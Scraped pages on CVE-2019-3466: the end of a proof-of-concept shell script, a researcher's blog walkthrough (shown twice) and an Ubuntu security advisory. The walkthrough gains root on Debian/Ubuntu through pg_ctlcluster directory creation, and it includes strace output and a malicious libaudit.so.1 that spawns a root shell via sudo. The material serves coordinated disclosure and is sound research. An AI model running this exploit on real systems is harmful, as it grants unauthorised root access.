cat>${src?}<<EOF/\* \* Author: Rich Mirch @0xm1rch \* PoC for pg\_ctlcluster arbitrary directory creation \* gcc -fPIC -o woot.o -Wall -c woot.c \* gcc -Wall -shared -Wl,-soname,libaudit.so.1 \ \* -Wl,-init,woot -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o \* sudo \*/#include <stdlib.h>#include <sys/types.h>#include <unistd.h>
void audit\_open(){ return;}
void audit\_log\_user\_message(){ return;}
void woot(){ setreuid(0,0); setregid(0,0); execl("/bin/sh","/bin/sh",NULL);}EOF
gcc -fPIC -o woot.o -Wall -c ${src?}gcc -Wall -shared -Wl,-soname,libaudit.so.1 \ -Wl,-init,woot -o ${target?} woot.o
if [[ $? -ne 0 ]]then echo "ERROR: gcc failed to create ${target?} - Did you run stage1 and restart postgres" exit 1fi
sudo "uid 0 is my friend"

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from blog.mirch.io_9a319f47_20250121_014557.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

![debian-200-deb10u2-vuln-code](https://blog.mirch.io/wp-content/uploads/2019/11/debian-200-deb10u2-vuln-code.png?w=712)

Vulnerable code in 200+deb10u2

With the ability to create an arbitrary directory owned by the postgres user I set out to find a fast path to root. I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html)¬†utility on the sudo binary to see if there were any attempts to load shared objects from nonexistent locations.

```
postgres@debian:~$ strace -ff sudo 2>&1|grep '.so.' |grep -w ENOENT
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libselinux.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libutil.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

I reviewed the list and decided that /usr/lib/sudo/haswell would be a good candidate.

```
postgres@debian:~$ ls -ld /usr/lib/sudo/haswell
ls: cannot access '/usr/lib/sudo/haswell': No such file or directory
```

At this point we have a privileged binary(sudo) attempting to load /usr/lib/sudo/haswell/libaudit.so.1 from a path does not exist. The goal now was to create this path, install a malicious libaudit.so.1 library and execute sudo. If all goes well a root shell will be spawned.

For the purpose of a simple PoC, I created a sudo rule to quickly restart the postgres service via systemd to demonstrate the vulnerability. In the real world this rule probably will not exist under the postgres account, however there could be other methods to induce a restart. Worse case an attacker would have to wait until the system was rebooted or some other event to cause the service to restart via systemd.

I automated the process by creating two scripts which can be found in my [Github](https://github.com/mirchr/security-research) repo. [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) sets stats\_temp\_directory to /usr/lib/sudo/haswell. After a restart, [CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh) builds a malicious libaudit.so.1 library,¬† stores it in /usr/lib/sudo/haswell, and executes sudo which spawns a root shell. Below is the source for libaudit.so.1 library. I had to add stubs for audit\_open() and audit\_log\_user\_message().

**Note:**¬†This has the potential to break sudo and should only be used in a controlled test environment. No attempt was made to make it reliable so use with caution.

```

/*
 * Author: Rich Mirch @0xm1rch
 * PoC for pg_ctlcluster arbitrary directory creation
 * gcc -fPIC -o woot.o -Wall -c woot.c
 * gcc -Wall -shared \
 *     -Wl,-soname,libaudit.so.1 \
 *     -Wl,-init,woot \
 *     -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o
 * sudo
 */
#include
#include
#include

void audit_open()
{
  return;
}

void audit_log_user_message()
{
  return;
}

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

Screenshot showing the execution of stage 1, a restart, and stage 2 resulting in a root shell.

![debian-buster-postgres-root](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)

## Timeline

* 2019-10-13: Report sent to Debian Security Team
* 2019-10-14: Debian acknowledges report
* 2019-11-13: Debian notified Ubuntu about upcoming release
* 2019-11-14: Debian releases advisory and patch

## References

* Debian Advisory: <https://www.debian.org/security/2019/dsa-4568>
* Ubuntu Advisory: <https://usn.ubuntu.com/4194-1/>
* PoC Exploit: [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh),¬†[CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh)

### Share this:

* [Twitter](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Uncategorized](https://blog.mirch.io/category/uncategorized/)Tags: [Linux](https://blog.mirch.io/tag/linux/), [PostgreSQL](https://blog.mirch.io/tag/postgresql/), [vulnerability](https://blog.mirch.io/tag/vulnerability/)

## Post navigation

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-5n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/333)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_b4276cc4_20250121_014556.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

![debian-200-deb10u2-vuln-code](https://blog.mirch.io/wp-content/uploads/2019/11/debian-200-deb10u2-vuln-code.png?w=712)

Vulnerable code in 200+deb10u2

With the ability to create an arbitrary directory owned by the postgres user I set out to find a fast path to root. I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html)¬†utility on the sudo binary to see if there were any attempts to load shared objects from nonexistent locations.

```
postgres@debian:~$ strace -ff sudo 2>&1|grep '.so.' |grep -w ENOENT
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libselinux.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libutil.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

I reviewed the list and decided that /usr/lib/sudo/haswell would be a good candidate.

```
postgres@debian:~$ ls -ld /usr/lib/sudo/haswell
ls: cannot access '/usr/lib/sudo/haswell': No such file or directory
```

At this point we have a privileged binary(sudo) attempting to load /usr/lib/sudo/haswell/libaudit.so.1 from a path does not exist. The goal now was to create this path, install a malicious libaudit.so.1 library and execute sudo. If all goes well a root shell will be spawned.

For the purpose of a simple PoC, I created a sudo rule to quickly restart the postgres service via systemd to demonstrate the vulnerability. In the real world this rule probably will not exist under the postgres account, however there could be other methods to induce a restart. Worse case an attacker would have to wait until the system was rebooted or some other event to cause the service to restart via systemd.

I automated the process by creating two scripts which can be found in my [Github](https://github.com/mirchr/security-research) repo. [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) sets stats\_temp\_directory to /usr/lib/sudo/haswell. After a restart, [CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh) builds a malicious libaudit.so.1 library,¬† stores it in /usr/lib/sudo/haswell, and executes sudo which spawns a root shell. Below is the source for libaudit.so.1 library. I had to add stubs for audit\_open() and audit\_log\_user\_message().

**Note:**¬†This has the potential to break sudo and should only be used in a controlled test environment. No attempt was made to make it reliable so use with caution.

```

/*
 * Author: Rich Mirch @0xm1rch
 * PoC for pg_ctlcluster arbitrary directory creation
 * gcc -fPIC -o woot.o -Wall -c woot.c
 * gcc -Wall -shared \
 *     -Wl,-soname,libaudit.so.1 \
 *     -Wl,-init,woot \
 *     -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o
 * sudo
 */
#include
#include
#include

void audit_open()
{
  return;
}

void audit_log_user_message()
{
  return;
}

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

Screenshot showing the execution of stage 1, a restart, and stage 2 resulting in a root shell.

![debian-buster-postgres-root](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)

## Timeline

* 2019-10-13: Report sent to Debian Security Team
* 2019-10-14: Debian acknowledges report
* 2019-11-13: Debian notified Ubuntu about upcoming release
* 2019-11-14: Debian releases advisory and patch

## References

* Debian Advisory: <https://www.debian.org/security/2019/dsa-4568>
* Ubuntu Advisory: <https://usn.ubuntu.com/4194-1/>
* PoC Exploit: [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh),¬†[CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh)

### Share this:

* [Twitter](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Uncategorized](https://blog.mirch.io/category/uncategorized/)Tags: [Linux](https://blog.mirch.io/tag/linux/), [PostgreSQL](https://blog.mirch.io/tag/postgresql/), [vulnerability](https://blog.mirch.io/tag/vulnerability/)

## Post navigation

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-5n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/333)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from usn.ubuntu.com_f88374de_20250121_014550.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4194-1: postgresql-common vulnerability

14 November 2019

postgresql-common could be made to create arbitrary directories.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 19.10](/security/notices?release=eoan)
* [Ubuntu 19.04](/security/notices?release=disco)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [postgresql-common](/security/cves?package=postgresql-common) - PostgreSQL database-cluster manager

## Details

Rich Mirch discovered that the postgresql-common pg\_ctlcluster script

incorrectly handled directory creation. A local attacker could possibly use

this issue to escalate privileges.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 19.10

* [postgresql-common](https://launchpad.net/ubuntu/%2Bsource/postgresql-common)
  -
  [204ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/postgresql-common/204ubuntu0.1)

##### Ubuntu 19.04

* [postgresql-common](https://launchpad.net/ubuntu/%2Bsource/postgresql-common)
  -
  [199ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/postgresql-common/199ubuntu0.1)

##### Ubuntu 18.04

* [postgresql-common](https://launchpad.net/ubuntu/%2Bsource/postgresql-common)
  -
  [190ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/postgresql-common/190ubuntu0.1)

##### Ubuntu 16.04

* [postgresql-common](https://launchpad.net/ubuntu/%2Bsource/postgresql-common)
  -
  [173ubuntu0.3](https://launchpad.net/ubuntu/%2Bsource/postgresql-common/173ubuntu0.3)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2019-3466](/security/CVE-2019-3466)

## Related notices

* [USN-4194-2](/security/notices/USN-4194-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

